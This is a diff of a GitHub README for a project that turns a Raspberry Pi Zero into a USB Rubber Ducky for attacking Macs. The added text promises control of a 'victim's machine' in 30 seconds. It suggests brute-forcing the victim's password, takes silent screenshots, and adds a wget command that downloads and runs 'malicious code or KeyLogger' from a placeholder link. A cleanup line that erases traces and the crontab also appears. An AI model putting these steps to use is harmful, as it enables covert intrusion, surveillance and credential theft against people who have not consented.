@@ -2,7 +2,9 @@
 
 [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://github.com/ohbriansung/usb_rubber_ducky/blob/master/LICENSE)
 
-There are some threads online about P4wnP1 ducky not running on Mac but here is an introduction about setting up P4wnP1 so your pi zero can attack Mac.
+This is a project to convert a normal Raspberry Pi Zero into a USB Rubber Ducky using P4wnP1. There are some threads online about P4wnP1 not running on Mac but here is an introduction about how to setup so your Pi would be able to attack a Mac. Only using pure bash on victim's machine, not third party library or package installation needed. In just 30 seconds, you'd gain control to victim's machine.
+
+![Ducky Raspberry Pi Zero](https://github.com/ohbriansung/usb_rubber_ducky/blob/master/pi_zero_ducky/img/concept.jpg)
 
 ## Demo Video
 
@@ -93,12 +95,14 @@ rm ~/app_support.sh; rm /tmp/app_support.sh; rm ~/.ssh/rsa_pub_; rm ~/Library/.h
 echo "" | crontab - && crontab -r
 ```
 
+*For a newer version of OSX, you would find out that you Mac pops out a window and you need to select OK manually. This is an improvement made by Apple for cron job. If you use the payload without cron job, you will be just fine.*
+
 ## What Now
 
 - Rick roll prank
 
 ```shell
-# One privilege of hacking Mac is we have access to applescript.
+# One privilege of hacking Mac is we have access to AppleScript.
 osascript -e 'set volume 7'
 open https://www.youtube.com/watch?v=dQw4w9WgXcQ
 ```
@@ -109,15 +113,26 @@ open https://www.youtube.com/watch?v=dQw4w9WgXcQ
 echo "password" | sudo -S ls
 ```
 
+*You would be able to run a background program to brute-force victim's password.*
+
 - Take a screenshot
 
 ```shell
+osascript -e 'set volume 0'
 screencapture ~/a.jpg
+```
+
+- Download and run a malicious code or KeyLogger to gain further control.
+
+```shell
+wget -O /tmp/x -q -o /dev/null http://link_to_malicious_code/
+chmod a+x /tmp/x
+/tmp/x
 ```
 
 - ~~Take a photo with Mac's webcam~~
 
-Apparently, Apple has a very strong security and privacy. It's nearly impossible to control hardware like webcam or mic without really operating on the machine.
+*Apparently, Apple has a very strong security and privacy. It's nearly impossible to control hardware like webcam or mic without really operating on the machine.*
 
 ## Author and Contributors
 
